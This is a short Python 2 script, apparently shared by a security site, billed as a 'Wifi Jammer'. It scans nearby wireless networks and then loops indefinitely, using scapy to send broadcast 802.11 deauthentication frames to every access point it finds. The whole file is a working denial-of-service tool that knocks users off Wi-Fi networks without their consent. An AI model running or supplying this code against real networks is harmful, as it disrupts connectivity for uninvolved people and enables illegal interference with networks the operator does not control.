#!/usr/bin/python
###################################################################
#
#                      Python Wifi Jammer
#                       @mohammadaskar2
#                    http://www.isecur1ty.org
#
###################################################################
from scapy.all import *
from wifi import Cell
import time,thread
import wireless

wifi1 = wireless.Wireless()
interface = wifi1.interface()

all_wifi = Cell.all(interface)
#print "SSID\t BSSID\t Channel\t Power\t"
print "[+] scannig for networks .."
bssid = []
time.sleep(2)
for wi in all_wifi:
 print "SSID is    : "  +    wi.ssid 
 print "BSSID is   : "  +    wi.address
 print "Channel is : "  +    str(wi.channel)
 print "Quality is : "  +    str(wi.quality)
 print "+" * 20
 bssid.append(wi.address)
 time.sleep(0.5)

print "#" * 70

def jam(address):
 conf.iface = "mon1" # The interface that you want to send packets out of, needs to be set to monitor mode
 bssid = address    #"F0:84:C9:5F:37:EE" # The BSSID of the Wireless Access Point you want to target
 client = "FF:FF:FF:FF:FF:FF" #
 count = 3 # The number of deauth packets you want to send (unlimted cause I used while loop)
 conf.verb = 0
 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
 for n in range(int(count)):
	sendp(packet)
        print 'Deauth num '+ str(n)  +  ' sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
while True:
 for item in bssid: 
  print "Jamming on : {0}".format(item)
  jam(item)
  #thread.start_new_thread(jam,(item,))
